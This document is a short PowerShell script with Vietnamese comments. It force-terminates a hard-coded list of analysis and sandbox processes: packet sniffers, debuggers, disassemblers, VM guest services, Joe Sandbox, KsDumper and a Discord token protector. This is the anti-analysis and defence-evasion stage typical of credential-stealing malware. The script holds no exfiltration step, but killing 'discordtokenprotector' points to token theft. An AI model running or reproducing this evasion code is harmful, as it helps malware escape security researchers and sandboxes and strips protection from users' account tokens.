$BLACKLISTED_TASKS = @('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

# Lặp qua từng tên trong danh sách
foreach ($task in $BLACKLISTED_TASKS) {
    # Lấy danh sách các tiến trình khớp với tên trong danh sách
    $processes = Get-Process -Name $task -ErrorAction SilentlyContinue

    # Nếu có tiến trình đang chạy, tắt chúng
    if ($processes) {
        foreach ($process in $processes) {
            try {
                Stop-Process -Id $process.Id -Force
                Write-Output "Đã tắt tiến trình: $task (Id: $($process.Id))"
            } catch {
                Write-Output "Không thể tắt tiến trình: $task (Id: $($process.Id))"
            }
        }
    } else {
        Write-Output "Không tìm thấy tiến trình: $task"
    }
}
